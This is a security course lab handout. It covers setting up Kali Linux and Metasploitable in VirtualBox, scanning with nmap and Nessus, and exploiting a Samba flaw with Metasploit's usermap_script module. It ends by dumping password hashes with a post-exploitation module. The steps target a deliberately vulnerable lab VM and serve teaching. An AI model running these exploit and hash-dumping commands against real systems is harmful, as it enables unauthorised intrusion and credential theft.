---
title: Training 1 - Setup the lab and first exploit
author: Loïc Delestra
header-includes:
    - \usepackage{fancyhdr}
    - \pagestyle{fancy}
    - \fancyhead[CO,CE]{Training 1 - Setup the lab and first exploit}
geometry: margin=2cm
---

##A/ Installing Virtual Box
For this training courses we will use lots of different system.   
We will create a virtual lab. It's a set of virtualised pre-build systems with internal networks.   
For the first training you will use a Kali Linux and a Metasploitable system.   

Kali Linux is a Linux distribution, based on Debian, with lots of security tools.  
Metasploitable is a Linux distribution with lots of security issues and vulnerable web applications.   

The perfect couple!

##B/ Setup the lab
The first part of this training will be setup your lab.   

@. Installing Virtualbox 5 in centos 6. It's not so trivial.   
usefull link:   
http://www.tecmint.com/install-virtualbox-on-redhat-centos-fedora/


Now you got the VirtualBox you will install your first Virtual Machine.   
Computers in A214 have /VM/ folder shared by every system in that machine. Before adding the first VM you will change the default image directory for /VM.

@. Installing Kali Linux
Offensive Security (the company behind Kali) provide a pre-installed VM of Kali.

Download url:   
Kali Linux for VMware and VirtualBox   
https://www.offensive-security.com/kali-linux-vmware-arm-image-download/   
Be sure to download the VirtualBox one (by default it display the VMware) 64bit with PAE.   
Unarchive the file. In virtualbox 'import Appliance' and import the Kali-Linux-2.0.0-vbox-i686.ova file.

@. Installing Metaspoitable   
Metasploitable is a vulnerable distribution provided by rapid7 the company behind the Metasploit framework.

Download link:
http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip   

Unzip it into /VM/ and add this existing VM into VirtualBox. Run it. Use login:msfadmin password:msfadmin
Check the network interface.

@. Create an internal network   
Kali and Metasploitable use two nat connections. Add a new interface at the Kali network as internal network.   
Change the existing interface of Metasploitable to use the same internal network as Kali.
Check the VMs can ping each other.


##C/ Scanning
Your two VMs are in the same network.

@. From kali run a nmap scan on your Metasploitable VM.
@. How many open port do you find?

You find lots of open port (ok its a distribution made for that), but how many are exploitable?
You will use a vulnerability scanner to find exploitable vulterability.
Nessus is one of the best vulnerability scanner. It's made by tenable network security. This product is a little expensive, for this training we will use the Evaluation version (with number of IP's per scanner limited).   

@. Download and install The nessus scanner.   

**In the Kali VM!**   
Download link:   
http://www.tenable.com/products/nessus/nessus-professional/evaluate   

Installation command: `sudo dpkg -i *.deb`   

Follow the installer instruction   

At the end of the installation your nessus is not ready yet. You have to 'configure it'

```
 - You can start nessusd by typing /etc/init.d/nessusd start
 - Then go to https://kali:8834/ to configure your scanner
```

@. When configuration is done. From the Nessus interface run a "Basic Network Scan" on your Metasploitable VM.
@. Look at the result. Specialy the critical and medium vulnerability. 
@. Look at the Samba 3.0.0 SamrChangePassword issue. You got lots of information about the vulnerability. In the right collumn 'exploitable with' give you the name of the metasploit module you can use for this vulnerability.

##D/ Exploit

@. In your kali open a terminal and run `msfconsole` it must run the metasploit framework.
@. Search for samba exploits with `search samba` . You got different exploits. into this list search for usermap_script.
@. use exploit/multi/samba/usermap_script  ... realy type `use exploit/multi/samba/usermap_script`   
This command will charge the module you want. The prompt must change and display the current module.
@. display options for this module with `show options`
@. Set the RHOST option with the ip of the Metasploitable VM. RHOST is the target machine. Use `set RHOST <ip>`
@. display options again
@. Start the exploit with the command `exploit`

##D/ Post exploit
With the exploit you got an interactive session with the target machine and you can execute a payload.   
Wikipedia: "In computer security, payload refers to the part of malware which performs a malicious action."


@. If your exploit succed you are in a session
@. presse `<ctrl> + z` in same time to put your session in background
@. List running session with `sessions -l`

@. You will use this session to execute a payload that will display password hash.   
I will not give you commands this time. Its work just like the previous part.
  - Use the post/linux/gather/hashdump module   
  - display options
  - set options how need to
  - exploit

If you succed you must see a list of user hashed password

**Call your teacher to check**



